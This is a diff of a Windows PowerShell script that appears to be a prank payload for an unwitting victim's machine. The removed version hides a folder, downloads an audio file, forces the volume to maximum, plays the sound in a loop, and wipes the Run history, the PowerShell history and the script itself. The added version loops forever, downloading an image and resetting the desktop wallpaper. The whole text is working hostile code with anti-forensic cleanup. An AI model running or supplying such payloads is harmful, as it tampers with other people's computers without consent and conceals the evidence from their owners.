@@ -1,19 +1,2 @@
-attrib +s +h "$env:USERPROFILE\temp"; iwr "https://raw.githubusercontent.com/Noshbit/miniature-octo-carnival/main/S.wav" -outfile "$env:USERPROFILE\temp\S.wav"; 
-$player = New-Object System.Media.SoundPlayer "$env:userprofile\temp\S.wav"
-Function Set-SpeakerVolume
-{ Param (
-  [switch]$min,
-  [switch]$max)
-  $wshShell = new-object -com wscript.shell
-  If ($min)
-  {1..50 | % {$wshShell.SendKeys([char]174)}}
-  ElseIf ($max)
-  {1..50 | % {$wshShell.SendKeys([char]175)}}
-  Else
-  {$wshShell.SendKeys([char]173)} }
-sleep 30;
-Set-SpeakerVolume -Max
-$player.PlayLooping();
-Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist; rm "$env:userprofile\temp\1.ps1"
-while ($true) {
-}
+attrib +s +h "$env:USERPROFILE\temp";
+While ($true) {iwr "https://eenvandaag.assets.avrotros.nl/_processed_/5/4/csm_ANP-48868814_094851fb41.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++}; sleep 30}
